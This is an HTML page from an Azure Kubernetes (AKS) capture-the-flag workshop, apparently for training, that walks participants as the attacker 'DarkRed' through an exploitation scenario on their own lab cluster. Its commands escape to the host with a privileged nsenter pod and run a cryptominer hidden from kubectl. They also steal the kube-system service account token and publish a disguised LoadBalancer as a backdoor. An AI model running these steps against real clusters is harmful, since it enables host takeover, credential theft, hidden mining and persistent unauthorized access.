
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
        <link rel="prev" href="../scenario_1_defense/">
      
      
        <link rel="next" href="../scenario_2_defense/">
      
      
      <link rel="icon" href="../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.17">
    
    
      
        <title>Scenario 2 Attack - AKS Capture the Flag</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/main.bcfcd587.min.css">
      
        
        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="red" data-md-color-accent="red">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#persistence-scenario-2-attack" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href=".." title="AKS Capture the Flag" class="md-header__button md-logo" aria-label="AKS Capture the Flag" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M6.5 20q-2.28 0-3.89-1.57Q1 16.85 1 14.58q0-1.95 1.17-3.48 1.18-1.53 3.08-1.95.63-2.3 2.5-3.72Q9.63 4 12 4q2.93 0 4.96 2.04Q19 8.07 19 11q1.73.2 2.86 1.5 1.14 1.28 1.14 3 0 1.88-1.31 3.19T18.5 20Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            AKS Capture the Flag
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Scenario 2 Attack
            
          </span>
        </div>
      </div>
    </div>
    
      
    
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header__source">
        <a href="https://github.com/lastcoolnameleft/aks-ctf" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    lastcoolnameleft/aks-ctf
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href=".." title="AKS Capture the Flag" class="md-nav__button md-logo" aria-label="AKS Capture the Flag" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M6.5 20q-2.28 0-3.89-1.57Q1 16.85 1 14.58q0-1.95 1.17-3.48 1.18-1.53 3.08-1.95.63-2.3 2.5-3.72Q9.63 4 12 4q2.93 0 4.96 2.04Q19 8.07 19 11q1.73.2 2.86 1.5 1.14 1.28 1.14 3 0 1.88-1.31 3.19T18.5 20Z"/></svg>

    </a>
    AKS Capture the Flag
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/lastcoolnameleft/aks-ctf" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    lastcoolnameleft/aks-ctf
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href=".." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Introduction
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Getting Started
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../scenario_1_attack/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Scenario 1 Attack
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../scenario_1_defense/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Scenario 1 Defense
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    Scenario 2 Attack
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    Scenario 2 Attack
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#backstory" class="md-nav__link">
    <span class="md-ellipsis">
      Backstory
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Backstory">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#name-darkred" class="md-nav__link">
    <span class="md-ellipsis">
      Name: DarkRed
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#motivations" class="md-nav__link">
    <span class="md-ellipsis">
      Motivations
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#initial-foothold" class="md-nav__link">
    <span class="md-ellipsis">
      Initial Foothold
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../scenario_2_defense/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Scenario 2 Defense
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../bonus_challenges/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bonus Challenges
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../bonus_hints/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bonus Challenge Hints
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../bonus_1_walkthrough/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bonus 1 Walkthrough
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../bonus_2_walkthrough/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bonus 2 Walkthrough
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../wrapup/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Wrap Up
  </span>
  

      </a>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#backstory" class="md-nav__link">
    <span class="md-ellipsis">
      Backstory
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Backstory">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#name-darkred" class="md-nav__link">
    <span class="md-ellipsis">
      Name: DarkRed
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#motivations" class="md-nav__link">
    <span class="md-ellipsis">
      Motivations
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#initial-foothold" class="md-nav__link">
    <span class="md-ellipsis">
      Initial Foothold
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  

  
  


<h1 id="persistence-scenario-2-attack">Persistence: Scenario 2 Attack<a class="headerlink" href="#persistence-scenario-2-attack" title="Permanent link">&para;</a></h1>
<h2 id="backstory">Backstory<a class="headerlink" href="#backstory" title="Permanent link">&para;</a></h2>
<h3 id="name-darkred">Name: <strong>DarkRed</strong><a class="headerlink" href="#name-darkred" title="Permanent link">&para;</a></h3>
<ul>
<li>Highly Skilled</li>
<li>Sells Exfiltrated Data for $$</li>
<li>Evades detection and employs persistence</li>
<li>Uses env-specific tooling</li>
<li>Creates bespoke payloads</li>
<li>Expert Kubernetes knowledge</li>
</ul>
<h3 id="motivations">Motivations<a class="headerlink" href="#motivations" title="Permanent link">&para;</a></h3>
<ul>
<li><strong>Red</strong> notices that the website is gone and the cryptominers have stopped reporting in.</li>
<li><strong>Red</strong> asks <strong>DarkRed</strong> for help trying to get back into the Kubernetes cluster and gives <strong>DarkRed</strong> the IP address.</li>
<li><strong>Red</strong> will split the revenue if <strong>DarkRed</strong> can get the miners back up and running.</li>
</ul>
<h2 id="initial-foothold">Initial Foothold<a class="headerlink" href="#initial-foothold" title="Permanent link">&para;</a></h2>
<h1 id="issue-original-ctf-exposed-a-nodeport-instead-of-a-lb-lb-feels-more-natural-but-havent-tested-nmap-with-it-and-doesnt-have-the-same-30k-port-number">ISSUE:  Original CTF exposed a NodePort instead of a LB.  LB feels more natural, but haven't tested nmap with it and doesn't have the same 30k+ port number.<a class="headerlink" href="#issue-original-ctf-exposed-a-nodeport-instead-of-a-lb-lb-feels-more-natural-but-havent-tested-nmap-with-it-and-doesnt-have-the-same-30k-port-number" title="Permanent link">&para;</a></h1>
<p>Seeing that the URL included port <code>31337</code> and that <strong>Red</strong> said it was a Kubernetes <code>cluster</code>, it was likely to be exposed via a <code>LoadBalancer</code> <code>service</code>. With this information, she has a feeling that more <code>services</code> might still be exposed to the web this way. <strong>DarkRed</strong> starts with indirect enumeration, such as searching on shodan.io, and follows up with direct port scanning via <code>nmap</code>.</p>
<p>To see what she'd see, from the Cloud Shell Terminal, scan the hundred ports around 31337 using a command similar to "nmap -sT -A -T4 -n -v -Pn your-ip-address-goes-here". Be absolutely sure to scan your assigned IP address.</p>
<p>This scan confirms <strong>DarkRed's</strong> suspicion that more services were present in this <code>cluster</code>. They all look like webservers, so explore them briefly with your browser.</p>
<p><strong>DarkRed</strong> notices that two of the services look like the company's main product, but the third is a juicy ops dashboard. Her intuition says that the dashboard is probably not maintained as carefully as the real product, and she focuses her attention there. Using tools such as <code>dirb</code>, <code>sqlmap</code>, <code>nikto</code>, and <code>burp</code>, she explores the dashboard, finds a vulnerability in a common web-development library, and exploits it to gain remote code execution on the server. For convenience, <strong>DarkRed</strong> installs a webshell for further exploration.</p>
<p>Now, let's become <strong>DarkRed</strong> and leverage this new access:</p>
<h2 id="deploying-miners">Deploying Miners<a class="headerlink" href="#deploying-miners" title="Permanent link">&para;</a></h2>
<p>The webshell can be found at <a href="http://your-ip:31336/webshell/" target="_blank"><a href="http://your-ip:31336/webshell/">http://your-ip:31336/webshell/</a></a>, and uses your workshop credentials as before.</p>
<p>Run the second attacker script to get this info:</p>
<div class="highlight"><pre><span></span><code><span class="go">./attack-2-helper.sh</span>
</code></pre></div>
<p>Run a few commands to make sure it's working and gather some basic information:</p>
<div class="highlight"><pre><span></span><code><span class="go">id; uname -a; cat /etc/lsb-release; ps -ef; env | grep -i kube</span>
</code></pre></div>
<p>Review the information. Check for Kubernetes access, and find the limits of our permissions:</p>
<div class="highlight"><pre><span></span><code><span class="go">export PATH=/tmp:$PATH</span>
<span class="go">cd /tmp; curl -LO https://dl.k8s.io/release/v1.28.10/bin/linux/amd64/kubectl; chmod 555 kubectl </span>
<span class="go">kubectl get pods</span>
<span class="go">kubectl get pods --all-namespaces</span>
<span class="go">kubectl get nodes</span>
<span class="go">kubectl auth can-i --list</span>
<span class="go">kubectl auth can-i create pods</span>
<span class="go">kubectl auth can-i create pods -n dev</span>
<span class="go">kubectl auth can-i create pods -n prd</span>
<span class="go">kubectl auth can-i create pods -n kube-system</span>
</code></pre></div>
<p>Now that we've reviewed the basic limits of our access, let's see if we can take over the host. If we can, that will give us many more options to fulfill our nefarious whims.</p>
<p>Using <a href="https://twitter.com/mauilion/status/1129468485480751104" target="_blank">a neat trick from Twitter</a>, let's attempt to deploy a container that gives us full host access:</p>
<div class="highlight"><pre><span></span><code><span class="go">kubectl run r00t --restart=Never -ti --rm --image lol --overrides &#39;{&quot;spec&quot;:{&quot;hostPID&quot;: true, &quot;containers&quot;:[{&quot;name&quot;:&quot;1&quot;,&quot;image&quot;:&quot;alpine&quot;,&quot;command&quot;:[&quot;nsenter&quot;,&quot;--mount=/proc/1/ns/mnt&quot;,&quot;--&quot;,&quot;/bin/bash&quot;],&quot;stdin&quot;: true,&quot;tty&quot;:true,&quot;imagePullPolicy&quot;:&quot;IfNotPresent&quot;,&quot;securityContext&quot;:{&quot;privileged&quot;:true}}]}}&#39;</span>
</code></pre></div>
<p>Let's unpack this a little bit: The kubectl run gets us a pod with a container, but the --overrides argument makes it special.</p>
<p>First we see <code>"hostPID": true</code>, which breaks down the most fundamental isolation of containers, letting us see all processes as if we were on the host.</p>
<p>Next, we use the nsenter command to switch to a different <code>mount</code> namespace. Which one? Whichever one init (pid 1) is running in, since that's guaranteed to be the host <code>mount</code> namespace! The result is similar to doing a <code>HostPath</code> mount and <code>chroot</code>-ing into it, but this works at a lower level, breaking down the <code>mount</code> namespace isolation completely. The <code>privileged</code> security context is necessary to prevent a permissions error accessing <code>/proc/1/ns/mnt</code>.</p>
<p>Convince yourself that you're really on the host, using some of our earlier enumeration commands:</p>
<div class="highlight"><pre><span></span><code><span class="go">id; uname -a; cat /etc/lsb-release /etc/redhat-release; ps -ef; env | grep -i kube</span>
</code></pre></div>
<p>It's been said that "if you have to SSH into a server for troubleshooting, you're doing Kubernetes wrong", so it's unlikely that cluster administrators are SSHing into nodes and running commands directly.  </p>
<p>AKS doesn't use Docker, so instead we'll need to use <code>crictl</code> instead.  By deploying our bitcoinero container via Docker on the host, it will show up in a <code>crictl ps</code> listing.  However, containerd is managing the container directly and not the <code>kubelet</code>, so the malicious container <em>won't show up in a <code>kubectl get pods</code></em> listing.  Without additional detection capabilities, it's likely that the cluster administrator will never even notice.</p>
<p>First we verify Docker is working as expected, then deploy our cryptominer, and validate it seems to be running.  For this, we will use <code>ctr</code>, the containerd CLI.</p>
<div class="highlight"><pre><span></span><code><span class="go">ctr containers ls</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="gp"># </span>ctr<span class="w"> </span>does<span class="w"> </span>not<span class="w"> </span>auto-pull<span class="w"> </span>images
<span class="go">ctr images pull docker.io/securekubernetes/bitcoinero:latest</span>

<span class="go">ctr run -d docker.io/securekubernetes/bitcoinero:latest bitcoinero &quot;/moneymoneymoney&quot; &quot;-c 1 -l 10&quot;</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="gp"># </span>Verify<span class="w"> </span>the<span class="w"> </span>container<span class="w"> </span>is<span class="w"> </span>running
<span class="go">ctr container ls</span>

<span class="gp"># </span>Verify<span class="w"> </span>the<span class="w"> </span>container<span class="w"> </span>doesn<span class="err">&#39;</span>t<span class="w"> </span>show<span class="w"> </span>up<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>pod<span class="w"> </span>list
<span class="go">kubectl --kubeconfig /var/lib/kubelet/kubeconfig get pods -A</span>
</code></pre></div>
<h2 id="digging-in">Digging In<a class="headerlink" href="#digging-in" title="Permanent link">&para;</a></h2>
<p>Now that <strong>DarkRed</strong> has fulfilled her end of the agreement and the miners are reporting in again, she decides to explore the cluster. With root access to the host, it's easy to explore any and all of the containers. Inspecting the production web app gives access to a customer database that may be useful later -- she grabs a copy of it for "safekeeping".</p>
<p>It would be nice to leave a backdoor for future access. Let's become <strong>DarkRed</strong> again and see what we can do:</p>
<p>First, let's steal the kubelet's client certificate, and check to see if it has heightened permissions:</p>
<div class="highlight"><pre><span></span><code><span class="go">ps -ef | grep kubelet</span>
</code></pre></div>
<p>Note the path to the kubelet's kubeconfig file: /var/lib/kubelet/kubeconfig</p>
<div class="highlight"><pre><span></span><code><span class="go">kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system</span>
</code></pre></div>
<p>Looks good! Let's try it:</p>
<div class="highlight"><pre><span></span><code><span class="go">kubectl --kubeconfig /var/lib/kubelet/kubeconfig run testing --image=busybox --rm -i -t -n kube-system --command echo &quot;success&quot;</span>
</code></pre></div>
<p>Oh no! This isn't going to work. Let's try stealing the default kube-system service account token and check those permissions. We'll need to do a little UNIX work to find them, since we're not exactly using the public API.</p>
<div class="highlight"><pre><span></span><code><span class="go">TOKEN=$(for i in `mount | sed -n &#39;/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p&#39;`; do if [ `cat $i` = &#39;kube-system&#39; ]; then cat `echo $i | sed &#39;s/.namespace$/\/token/&#39;`; break; fi; done)</span>
<span class="go">echo -e &quot;\n\nYou&#39;ll want to copy this for later:\n\nTOKEN=\&quot;$TOKEN\&quot;&quot;</span>
</code></pre></div>
<p><div class="highlight"><pre><span></span><code><span class="go">kubectl --token &quot;$TOKEN&quot; --insecure-skip-tls-verify --server=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT auth can-i get secrets --all-namespaces</span>
</code></pre></div>
Yes, this looks better! We save that token in our PalmPilot for later use, and publish a NodePort that will let us access the cluster remotely in the future:</p>
<div class="highlight"><pre><span></span><code><span class="go">cat &lt;&lt;EOF | kubectl --kubeconfig /var/lib/kubelet/kubeconfig apply -f -</span>
<span class="go">apiVersion: v1</span>
<span class="go">kind: Service</span>
<span class="go">metadata:</span>
<span class="go">  name: istio-mgmt</span>
<span class="go">spec:</span>
<span class="go">  type: LoadBalancer</span>
<span class="go">  ports:</span>
<span class="go">    - protocol: TCP</span>
<span class="go">      port: 31313</span>
<span class="go">      targetPort: $KUBERNETES_SERVICE_PORT</span>
<span class="go">---</span>
<span class="go">apiVersion: v1</span>
<span class="go">kind: Endpoints</span>
<span class="go">metadata:</span>
<span class="go">  name: istio-mgmt</span>
<span class="go">subsets:</span>
<span class="go">  - addresses:</span>
<span class="go">      - ip: `sed -n &#39;s/^  *server: https:\/\///p&#39; /var/lib/kubelet/kubeconfig`</span>
<span class="go">    ports:</span>
<span class="go">      - port: $KUBERNETES_SERVICE_PORT</span>
<span class="go">EOF</span>
</code></pre></div>
<p>Press control-d to exit (and delete) the <code>r00t</code> pod.</p>
<p>If you like, you may validate that external access is working, using cloud shell:</p>
<div class="highlight"><pre><span></span><code><span class="go">if [ -z &quot;$TOKEN&quot; ]; then</span>
<span class="go">  echo -e &quot;\n\nPlease paste in the TOKEN=\&quot;...\&quot; line and try again.&quot;</span>
<span class="go">else</span>
<span class="go">  EXTERNAL_IP=`gcloud compute instances list --format json | jq &#39;.[0][&quot;networkInterfaces&quot;][0][&quot;accessConfigs&quot;][0][&quot;natIP&quot;]&#39; | sed &#39;s/&quot;//g&#39;`</span>
<span class="go">  kubectl --token &quot;$TOKEN&quot; --insecure-skip-tls-verify --server &quot;https://${EXTERNAL_IP}:31313&quot; get pods --all-namespaces</span>
<span class="go">fi</span>
</code></pre></div>
<p>Now we have remote Kubernetes access, and our associate's bitcoinero containers are invisible. All in a day's work.</p>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
        <div class="md-social">
  
    
    
    
    
      
      
    
    <a href="https://github.com/lastcoolnameleft/aks-ctf" target="_blank" rel="noopener" title="github.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "..", "features": [], "search": "../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../assets/javascripts/bundle.1e8ae164.min.js"></script>
      
    
  </body>
</html>